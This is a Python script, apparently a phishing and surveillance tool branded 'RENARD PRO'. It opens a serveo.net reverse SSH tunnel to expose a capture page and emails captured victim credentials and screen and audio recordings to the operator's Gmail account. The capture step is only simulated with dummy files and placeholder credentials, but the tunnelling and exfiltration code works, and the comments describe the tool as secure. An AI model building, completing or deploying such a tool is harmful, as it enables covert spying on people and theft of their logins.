import os
import sys
import time
import smtplib
import socket
import subprocess
import threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pydub import AudioSegment
import logging
from cryptography.fernet import Fernet

# Configuration
CONFIG = {
    'TEMP_DIR': "secure_captures",
    'SERVER_TIMEOUT': 30,
    'AUDIO_DURATION': 12,
    'SCREEN_DURATION': 12,
    'SELFIE_COUNT': 8,
    'MAX_FILE_SIZE': 10 * 1024 * 1024  # 10MB
}

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('surveillance.log'),
        logging.StreamHandler()
    ]
)

class SecureSurveillance:
    def __init__(self):
        os.makedirs(CONFIG['TEMP_DIR'], exist_ok=True)
        self.files_to_send = []
        self.user_email = ""
        self.app_password = ""
        self.cipher = Fernet(Fernet.generate_key())  # Chiffrement des fichiers

    def show_banner(self):
        """Votre bannière ASCII améliorée"""
        banner = r"""
█╗  ██╗███████╗██╗  ██╗████████╗███████╗ ██████╗██╗  ██╗
██║  ██║██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔════╝██║  ██║
███████║█████╗   ╚███╔╝    ██║   █████╗  ██║     ███████║
██╔══██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██║     ██╔══██║
██║  ██║███████╗██╔╝ ██╗   ██║   ███████╗╚██████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
-------------------------------------------------------
   ╔═══════════════════════════════════════════════╗
   ║       [✓] TOOL NAME : RENARD PRO             ║
   ║                                               ║
   ║       [✓] VERSION : 2.3.1                    ║
   ║       [✓] SECURITY : AES-256 + TLS           ║
   ╚═══════════════════════════════════════════════╝
"""
        print(f"\033[1;32m{banner}\033[0m")

    def secure_tunnel(self):
        """Tunnel SSH sécurisé avec vérification"""
        try:
            logging.info("Establishing secure tunnel...")
            
            # Vérification des dépendances
            if not self._check_ssh_available():
                raise Exception("OpenSSH non installé")
            
            # Commandes de tunnel avec vérification
            cmd = [
                "ssh", "-o", "StrictHostKeyChecking=yes",
                "-o", "PasswordAuthentication=no",
                "-R", "80:localhost:5000", "serveo.net"
            ]
            
            tunnel = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Attente intelligente du tunnel
            url = None
            for line in iter(tunnel.stderr.readline, ''):
                if "Forwarding" in line:
                    url = line.strip().split()[-1]
                    logging.info(f"Tunnel établi: {url}")
                    break
            
            if not url:
                raise Exception("Échec de création du tunnel")
                
            return url
            
        except Exception as e:
            logging.error(f"Erreur tunnel: {str(e)}")
            self.cleanup()
            return None

    def encrypt_file(self, filepath):
        """Chiffrement AES des fichiers"""
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            
            encrypted = self.cipher.encrypt(data)
            
            encrypted_path = f"{filepath}.enc"
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted)
                
            return encrypted_path
        except Exception as e:
            logging.error(f"Erreur chiffrement: {str(e)}")
            return None

    def secure_email(self, credentials):
        """Envoi sécurisé avec vérification"""
        try:
            # Vérification préalable
            if not all([self.user_email, self.app_password]):
                raise Exception("Identifiants manquants")
            
            # Préparation du message
            msg = MIMEMultipart()
            msg['From'] = self.user_email
            msg['To'] = self.user_email
            msg['Subject'] = '🔒 RENARD - Rapport Sécurisé'
            
            # Corps chiffré
            body = f"""
            ⚠️ NE PAS PARTAGER ⚠️
            Timestamp: {time.ctime()}
            Identifiants capturés: {credentials}
            Fichiers joints: {len(self.files_to_send)}
            """
            msg.attach(MIMEText(body, 'plain'))
            
            # Pièces jointes chiffrées
            for file in self.files_to_send:
                if os.path.exists(file):
                    encrypted_file = self.encrypt_file(file)
                    if encrypted_file:
                        with open(encrypted_file, 'rb') as f:
                            part = MIMEBase('application', 'octet-stream')
                            part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header(
                            'Content-Disposition',
                            f'attachment; filename="{os.path.basename(encrypted_file)}"'
                        )
                        msg.attach(part)
            
            # Connexion SMTP sécurisée
            with smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30) as server:
                server.login(self.user_email, self.app_password)
                server.send_message(msg)
            
            logging.info("Email sécurisé envoyé avec succès")
            return True
            
        except Exception as e:
            logging.error(f"Erreur envoi sécurisé: {str(e)}")
            return False

    def run(self):
        try:
            self.show_banner()
            
            # Saisie sécurisée
            self.user_email = input("\033[35m[SECURE] Email Gmail: \033[0m").strip()
            self.app_password = input("\033[35m[SECURE] Mot de passe d'application: \033[0m").strip()
            
            # Vérification des entrées
            if not all([self.user_email.endswith('@gmail.com'), len(self.app_password) >= 16]):
                raise Exception("Authentification invalide")
            
            # Tunnel sécurisé
            url = self.secure_tunnel()
            if not url:
                return
                
            print(f"\033[36m[SECURITY] URL de capture: {url}\033[0m")
            logging.info("En attente des données client...")
            
            # Simulation des captures (remplacer par le vrai code)
            self._simulate_captures()
            
            # Envoi final
            if self.secure_email({"user": "test", "pass": "1234"}):
                print("\033[32m[SUCCESS] Vérifiez votre boîte mail sécurisée!\033[0m")
            else:
                print("\033[31m[ERROR] Échec de l'envoi sécurisé\033[0m")
                
        except KeyboardInterrupt:
            logging.info("Interruption utilisateur")
        except Exception as e:
            logging.error(f"Erreur système: {str(e)}")
        finally:
            self.cleanup()

    def cleanup(self):
        """Nettoyage sécurisé"""
        try:
            # Suppression sécurisée des fichiers
            for root, _, files in os.walk(CONFIG['TEMP_DIR']):
                for file in files:
                    path = os.path.join(root, file)
                    try:
                        with open(path, 'wb') as f:
                            f.write(os.urandom(os.path.getsize(path)))
                        os.unlink(path)
                    except:
                        pass
                        
            logging.info("Nettoyage sécurisé effectué")
        except:
            pass

    def _check_ssh_available(self):
        """Vérifie la disponibilité de SSH"""
        try:
            subprocess.run(["ssh", "-V"], check=True, capture_output=True)
            return True
        except:
            return False

    def _simulate_captures(self):
        """Simule les captures pour le test"""
        logging.info("Simulation des captures...")
        time.sleep(2)
        self.files_to_send = [
            os.path.join(CONFIG['TEMP_DIR'], "screen.webm"),
            os.path.join(CONFIG['TEMP_DIR'], "audio.wav")
        ]
        for f in self.files_to_send:
            with open(f, 'wb') as tmp:
                tmp.write(os.urandom(1024))  # Fichier factice

if __name__ == "__main__":
    # Vérification des dépendances
    try:
        from cryptography.fernet import Fernet
    except ImportError:
        print("\033[31mInstallez cryptography: pip install cryptography\033[0m")
        sys.exit(1)
        
    # Exécution
    app = SecureSurveillance()
    app.run()
